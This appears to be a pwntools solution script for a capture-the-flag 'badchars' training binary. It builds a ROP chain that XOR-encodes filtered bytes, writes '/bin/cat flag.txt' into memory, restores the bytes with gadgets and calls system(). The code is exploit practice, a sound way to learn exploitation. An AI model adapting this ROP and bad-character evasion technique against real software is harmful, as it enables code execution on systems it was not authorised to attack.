#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

BAD_CHARS = b"bic/ fns"

pop_r12_r13 = 0x0000000000400b3b
pop_r14_r15 = 0x0000000000400b40
pop_r12_r13_r14_r15 = 0x0000000000400bac
mov_qword_ptr_r13_r12 = 0x0000000000400b34
xor_byte_ptr_r15_r14 = 0x0000000000400b30

XOR = 0xAB

open('cyclic.txt', 'w').write(cyclic(0x100, n=8) + '\n')
N = cyclic_find('faaaaaaag', n=8)

e = ELF('badchars')
data = e.get_section_by_name('.data').header['sh_addr']
data += 10 # Offset to remove bad chars from target address


def save_string(rop, string, dest):
    while len(string) % 8 != 0:
        string += b'\x00'

    for i in range(int(len(string) / 8)):
        s = string[i*8:(i+1)*8]
        s_xor = b""
        p = data + i*8

        # Find bad characters in string and xor them away
        for ii, c in enumerate(s):
            bad = False
            for b in BAD_CHARS:
                if c == b:
                    s_xor += bytes([XOR ^ c])
                    bad = True
                    break

            if not bad:
                s_xor += bytes([c])

        rop.raw(pop_r12_r13)
        rop.raw(u64(s_xor)) # Why is it padding my string?
        rop.raw(p)
        rop.raw(mov_qword_ptr_r13_r12)

        # Make sure we restore the xor'ed characters
        for ii, c in enumerate(s):
            for b in BAD_CHARS:
                if c == b:
                    rop.raw(pop_r14_r15)
                    rop.raw(XOR)
                    rop.raw(p+ii)
                    rop.raw(xor_byte_ptr_r15_r14)


s = b"/bin/cat flag.txt"
rop = ROP(e)
save_string(rop, s, data)
rop.system(data)

print(rop.dump())
for c in rop.chain():
    if c in BAD_CHARS:
        print(chr(c), hex(c))
        print("BAD CHAR IN OUTPUT")

open('input.txt', 'wb').write(b'A' * N + rop.chain() + b'\n')
